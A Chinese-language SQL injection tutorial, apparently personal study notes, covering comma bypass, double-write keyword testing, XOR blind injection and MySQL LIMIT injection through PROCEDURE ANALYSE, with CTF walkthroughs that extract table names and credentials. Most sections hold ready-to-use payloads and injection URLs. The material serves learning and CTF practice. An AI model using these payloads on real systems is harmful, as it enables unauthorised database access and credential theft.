<center>特殊的绕过</center>

此章会讲一些sql注入的特殊绕过姿势。



#### 1.	逗号绕过





> 此题的实例为bugku中web的`insert into`注入



##### union的逗号绕过



union的逗号绕过很简单，只需要使用join的方式。就能够绕过逗号



而使用`join`的方式如下：

```
union select 1,2,3,4;

union select * from ((select 1)A join (select 2)B join (select 3)C join (select 4)D);

union select * from ((select 1)A join (select 2)B join (select 3)C join (select group_concat(user(),' ',database(),' ',@@datadir))D);
```





##### 盲注的逗号绕过



> bugku的CTF题的payload:
>
> ```
> 1' and (select case when length(database())=1 then sleep(5) else 1 end) and '1
> 
> 1' and (select case when substr((select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name='flag') from %s for 1)='%s' then sleep(5) else 1 end) and '1
> ```





盲注的逗号绕过比较有意思，因为`if`和`substr`都被限制住了。

首先我们需要`case when then else end`语句来代替if语句。





###### case when then else end

此语句的基本语法如下：

```
CASE expression
    WHEN condition1 THEN result1
    WHEN condition2 THEN result2
   ...
    WHEN conditionN THEN resultN
    ELSE result
END
```



CASE 表示函数开始，END 表示函数结束。如果 condition1 成立，则返回 result1, 如果 condition2 成立，则返回 result2，当全部不成立则返回 result，而当有一个成立之后，后面的就不执行了。

> 其实就相当于`if` `else if` `else`一样的。不过用作安全的盲注用不了那么多`else if`。(ps.又不是开发)



简单理解为：(case when    `条件`    then    `条件为true执行语句`    else    `条件为false执行语句`    end)

> 此语句最好用`()`小括号包裹，否则容易看错





需要注意的是`case when then end`语句是放在查询部分。而不是where子句部分。

如下，实例：

```
select (case when id=1 then '管理员' else '用户' end) from users;
```



输出结果

```
+-----------------------------------------------------+
| (case when id=1 then '管理员' else '用户' end)      |
+-----------------------------------------------------+
| 管理员                                              |
| 用户                                                |
| 用户												|
```



其实也能这样用：

```
select (case id when 1 then '管理员' else '用户' end) from users;
```

> 当然它返回的结果也一样。



###### substr()



substr()想要绕过逗号很简单。只需要使用substr()的另一种形式就行了。

如下：

```
substr((database) from 1 for 1)					//此处可以用()包裹数据，就可以不用空格
```

参数：

+ `from`：from后的1表示从1个字符开始截取
+ `for`：for后的1表示截取长度

> 其实可以不要for和后面的1.这样的话。默认会返回后面的所有字符
>
> ```
> substr(database()from2)				//这样的话，就会返回从第二个字符开始的所有字符
> ```
>
> 但是使用ascii函数比较的时候只会用第一个字符进行比较。
>
> 这样我们就可以不用for了。
>
> ```
> ascii(substr(database()from(1)))=115					115为s，返回True
> ```







也就是说它和原本的形式其实是一样的。只是把两个逗号都换成了`from`和`for`。

和下面这个一样：

```
substr((database()),1,1)
```





#### 2.	双写绕过测试



>  正常的情况，关键词被过滤的话。是不会告诉你的，需要反复的去测试哪些关键词被过滤掉了。



如果存在注入点，但是却不能通过`1' and 1=1%23 `来进行测试回显点的话，第一反应就应该是有过滤的情况发生，可能是空格被过滤；有可能是关键词被过滤；有可能是拦截关键词,拦截到了直接抛出错误。

> 其它的情况我们先不说，就只说双写绕过的情况。



一般双写绕过的话，只会拦截一些`and`，`or`，`union`，`select`，`extractvalue`这样的一些关键词。

而不会对`table`，`information_schema`，`where`，`in`，`column`等关键词进行过滤





如果想要判断过滤的关键词的话：

可以通过取别名的方式来进行测试被过滤关键词





##### union测试

> 如果是union注入，测试关键词

```
-1' uniunionon selselectect 1,2,(selselectect 1 from (selselectect 1)a)%23 
```

> 此处可以把a替换为想要测试的关键词

原理是：

​	因为后面的union select子句中，如果没有a作为别名的话会抛出一个报错，所以`(select 1)`后面的必须有一个别名。而如果关键词被过滤了的话，就没有别名了。此时就会抛出一个报错，不能正常回显



通过这种方式就可以测试关键词是否被过滤。



**需要注意的是**：

​	有不少关键词是不能作为别名的。例如：`table`，`column`，`schema`

​		这些关键词的话，就可以通过双写   来测试是否被过滤。例如：`tabletable`，`column`，`schemaschema`



​	通过这种双写就可以测试关键词是否被过滤。因为`and`不能作为别名，但是`andand`却能作为别名。

​	而关键词过滤，不关你有几次都会被过滤，导致没有别名





也就是说对于特殊的关键词别名而言。需要双写(ps.这里的双写  不是   双写绕过的双写)。如下：

```
-1' ununionion seselectlect 1,2,(selselectect 1 from (selselectect 1)tabletable)%23
```

> 此处table没有被过滤所以能正常回显。
>
> 如果是`and`这种被过滤掉的关键词的话。无论双写几次都不会回显的





##### 盲注测试



```
1' anandd (selselectect 1 from (selselectect 1)a)='1
```

> 同样是把此处的a替换为想要测试的关键词。原理和union测试一样。







#### 3.	^过滤测试

> 其实^注入，算是一种盲注方式

可以通过  逻辑异或 `^` 来做过滤测试。测试哪些字符被过滤



首先说明，异或`^`的优先级很高。甚至比`!`的优先级还要高。

还有sql中的异或，确切来说，是来进行位运算的。



通过下面的方式就可以进行判断过滤：

```
select * from users where id='1'^length('and')='1
```

注意这里的逻辑：首先length('and')为3，然后因为`^`的优先级很高，所以`^`进行位运算。结果为2。



最后id=2=1，后面的`=1`表示true。代表整个等式成立与否。

> 第二个等号后的值除了`0`,`1`其他没意义。而0的话则会输出所有结果。相当于代表取反。但是where子句不会抛出错误。如果有多个=的话，也是一样。多个0会相互抵消。而1则不会
>
> 例如：如果`where usernam='1'`的话，只会返回`username`=1的数据。
>
> 但是：`where username='1'='0'`的话<------这会弹出全部内容
>
> 不过`where id=0`的话则不会弹出数据，他会按照`id=0`的逻辑来。如果是`id=0=0`的话就会弹出所有数据
>
> `0`和`1`加上`=`的话，有很多有意思的结果，可以没事儿试试





异或有很多需要注意的点：

```
select * from users where username=0      //这会返回全部数据，因为列类型为varchar。
												//这不是因为^的事
		//如果是1则会正常运行。如果列为id这种int类型的话，
select * from users where id=1=0		//也会弹出除了id=1外的全部数据
```



##### 字符和数字的^运算



下面说一下确切的字符和数字之间的异或运算：

+ 字符传和字符传：无论两个字符传其中一个：有多长，首字母ascii值有多大。两个字符传进行异或。都只会返回`0`
+ 字符和数字：会直接摒弃字符串，直接取数字的值。作为异或运算的结果
+ 数字和数字：直接进行位运算

+ sleep()：如果异或的是个sleep()函数的话，如：`where id=1^sleep(3)`。这会延迟十倍，就像是`or`



##### 实际作用

也就是说，^的作用为：

+ 可以进行盲注

  ```
  select * from users where id='0'^(length(database())>1)='1
  ```

  

+ 可以用来探测过滤关键字。因为一般就算过滤也不会过滤^

  ```
  select * from users where id='1'^length('and')='1
  						#进行位运算，通过返回id猜length('and')的长度判断过滤
  ```

  

+ 如果是post注入，可以用来探测另一个关键字。不过这种方式的局限性很大，其实就和盲注差不多，不过盲注容易被过滤。不过猜测另一个的话，就需要猜另一个字段的字段名是什么，才能进行探测。

  而且只适合于打CTF这种，数据库只有一条数据的情况。

  ```
  select * from users where username='kkp'^(ascii(substr((password)from(2)))!=114)='1';
  						//这种方式无法进行猜解，因为猜出来的是所有密码的集合。如果只有一条数据的话，倒可以猜一下试试
  
  
  select * from users where id='1'^(ascii(substr((password)from(2)))!=114)='1';
  						//这种方式因为id和password冲突的原因可以猜id=1的数据的密码
  	//也可以使用length的方式来猜列名
  select * from users where id='0'^(length(passwd)>1)='1';
  ```

  > 注意异或的逻辑





##### 实例



bugku的web中`sql注入2`



此题为一道sql的post注入题。

> (ps.其实此题可以使用弱口令，和DS_Store通关)



此题中，能拦截的都拦截了，恶心的一匹。而且密码框中没有注入点。只有通过用户框注入。



此题因为是拦截的原因，不能使用双写绕过，大小写绕过。其他的绕过方式估计也不行。

不能使用union注入，报错注入，堆叠没试过应该也不行。只能通过盲注。

不能用时间盲注，bool盲注的`and`和`or`也被过滤。逗号也被过滤。







此题我们就使用`^`异或盲注：

通过测试，发现异或并没有被过滤掉。因为后端查询是通过uname字段查询的，而不是id。



先测试异或注入是否可用：

```
uname:kkp'^'0
passwd:1
```

> 后端处理逻辑：先异或运算，因为异或运算，字符串和数字运算得到的结果为数字。
>
> 而且本该作为判断条件的字段为`varchar`类型，得到的值确实`0`。所以会返回所有数据。

弹出密码错误。这证明我们没有被过滤掉。并且执行成功。



测试数据库长度：

```
kkp'^(length(database())>1)='1					//返回username错误
kkp'^(length(database())>100)='1				//返回passwd错误
```

> 注意这里的执行逻辑：
>
> 前者括号中返回`true`也就是1。1和kkp异或得到1。查询username为1的数据。查不出数据，所以返回username错误
>
> 后者括号中返回`false`也就是0。0和kkp异或得到0。查询username为0的数据，查询的到，但是密码是错误的，所以返回密码错误。
>
> 最后面的`=1`只是接上单引号。起的sql效果为：让等式成立。
>
> (ps.其实这里可以使用`1'^(length(database())>1)='1`，这样的话逻辑就不会那么绕)



这里可以猜出来库名长度为3



也可以通过如下方式来猜解库名：

```
1'^(ascii(substr((database())from(1)))=115)='1
```

> 通过写脚本盲注，就可以获得数据库名`ctf`



其实到这一步就只有等死了。因为爆不出来表名和列名，or被拦截。无法查询information_schema中的数据



看了网上大神的writeup。听说是猜列名为`passwd`。(ps.因为前端input的name就为`passwd`)

```
1'^(length(passwd)>1)='1							//猜解passwd长度
								//正确返回passwd error，错误返回username error
```

> 也可以通过这种办法来测试，字段名。字段名正确的话，返回passwderror。错误返回username error

> 此方法值适用于数据库只有一条数据的情况。否则猜出来的就是所有密码的集合。

猜解出来的`passwd`长度为32，貌似是md5的情况。



接下来就可以进行猜解passwd：

```
1'^(ascii(substr((passwd)from(1)))=48)='1		//正确弹出passwd error；
												//错误弹出username error
```

> 通过这种方式，写出来脚本。就可以猜出passwd密码。
>
> 然后md5解码一下，就可以得到密码。`admin123`

其实我们只是得到了密码我们用户名并没有得到。不过可以绕过去

```
username:1'^'0
passwd:admin123
```



使用`^`异或注入理由：

太多关键字被过滤掉了。

最好后面学别个弄个字典做模糊测试。免得被拦截或过滤了，还得一个一个试



>  其实貌似还有一种`-`的方法。我没学，我觉得这就差不多了





#### 4.	limit注入



此处的`limit`注入，只针对mysql版本在5.0.0~5.6.6。

>  (ps.应该是哈，我在我自己的5.7.26版本就不能用。只有又下了一个5.5.29版本的)
>
>  经过确认，确实版本大于5.6.6.就不能使用limit注入。下文中的两种方法都不能进行注入。直接就会报语法错误。



一般`limit`都会搭配`order by `使用，此处分为两种情况进行描述：

​		1.没有`order by`

​		2.有`order by`





##### 无order by 

这种情况可以使用union注入，

```
select * from users limit 0,1 union select 1,2,3;
```

> 注意此处的列一定要对上。否则的话会抛出一个报错



也可以通过这种方式来进行报错注入：

```
select * from users limit 0,1 union select 1,2,(extractvalue(1,concat(0x7e,(database()))));
```

> 其实正常的union注入也可以使用报错
>
> ```
> select * from users union select 1,2,(extractvalue(1,concat(0x7e,(database()))));
> ```







##### 有order by



> 详细讲解此篇的[博客](https://www.freebuf.com/articles/web/57528.html)和[这个](https://www.jianshu.com/p/6c1420a7a7d9)

> 此题的实战是hackinglab的注入关第四题[链接](http://lab1.xseclab.com/sqli5_5ba0bba6a6d1b30b956843f757889552/index.php?start=0&num=1)



此处就只讲解怎么用，不说原理是什么。

> ps.其实我自己也不懂。等有时间看看这个的原理







payload为`procedure analyse`

`analyse()`函数中有两个参数，正常的话一个参数作为报错注入，另一个参数就写`1`

> 之所以使用`procedure analyse`是因为有order by 的话，无法使用union注入，应为mysql 的语法规则定义了，union必须在order by 之前。而现在的情况是在order by  和limit 之后进行注入。



> 一般默认`limit`后的`0`,`1`分别是两颗传参点。也就是注入点。



###### 报错注入

payload：

```
select * from users order by id limit 0,1 procedure analyse(1,extractvalue(1,concat(0x7e,(select database()))));
```

如果有时候第二个注入点不能使用的话，可以不跟在第二个参数后面，直接跟在第一个参数后面，并且不要第二个参数：

```
select * from users order by id limit 0 procedure analyse(1,extractvalue(1,concat(0x7e,(select database()))));
```





###### 时光注入



>  把这个称为时光注入的原因是，因为此注入方式比较扯



此处讲一下一个很重要的函数：`benchmark()`



`benchmark`函数是通过大量的计算表达式，来达到时间注入的目的

语法：

```
benchmark(count,expr)				//函数示例：benchmark(5000000,sha(1))
```

参数：

> 此处先说expr，也就是第二个参数

+ `expr`：表达式，一般设置为`md5(1)`或`sha(1)`。一般是用于设置要进行计算的表达式

+ `count`：一般为较大的数字。用于设置计算次数



此处的时光注入，还是需要`procedure analysse`函数，还需要报错函数`extractvalufe()`配合



payload：

```
select * from users order by id limit 0,1 procedure analyse((select extractvalue(1,concat(0x7e,(if((mid(database(),1,1)='s'),benchmark(5000000,sha(1)),1))))),1);
```

> emmm……自己看一下逻辑顺序，
>
> 其实就是`analyse()`函数第一个参数里`select`一个`extractvalue`函数，然后函数里面本该查询的地方，又放了一个`if`判断式子。同时`mid`函数代替了`substr`。`benchmark`代替了`sleep`。最后面是`analyse`的第二个参数



时光注入爆库名

```
select * from users order by id limit 0,1 procedure analyse((select extractvalue(1,concat(0x7e,(if((mid(database(),1,1)='s'),benchmark(5000000,sha(1)),1))))),1);
```





按理说，这种时光注入，也能够注入`limit`中的第一个参数。不过我没有试过。

大致过程和`limit`报错注入，通过第一个参数注入的方式差不多





###### CTF_payload



> 此题为`limit`注入，而且只能从第一个参数处注入。此题没有引号什么的包裹数据。而且`'`单引号被转义了



注入第一个参数。

> 第二个参数不能进行注入

猜解数据库名

```
http://lab1.xseclab.com/sqli5_5ba0bba6a6d1b30b956843f757889552/index.php?start=0 procedure analyse(1,(extractvalue(1,concat(0x7e,(select database())))))%23&num=1
```



猜解表名

```
http://lab1.xseclab.com/sqli5_5ba0bba6a6d1b30b956843f757889552/index.php?start=0 procedure analyse(1,(extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database())))))%23&num=1
```





猜解列名：

```
http://lab1.xseclab.com/sqli5_5ba0bba6a6d1b30b956843f757889552/index.php?start=0 procedure analyse(1,(extractvalue(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=0x61727469636C65)))))%23&num=1
```

> 此处因为单引号转义，所以使用十六进制来表示表名



猜解另一张表名：

```
http://lab1.xseclab.com/sqli5_5ba0bba6a6d1b30b956843f757889552/index.php?start=0 procedure analyse(1,(extractvalue(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=0x75736572)))))%23&num=1
```





猜其中数据

```
http://lab1.xseclab.com/sqli5_5ba0bba6a6d1b30b956843f757889552/index.php?start=0 procedure analyse(1,(extractvalue(1,concat(0x7e,mid((select group_concat(username,0x7e,password) from user),20)))))%23&num=1
```

> 此处因为查出来的数据过长。所以使用`mid`函数进行显示(ps.从第20位开始显示)

flag为：`myflagishere`





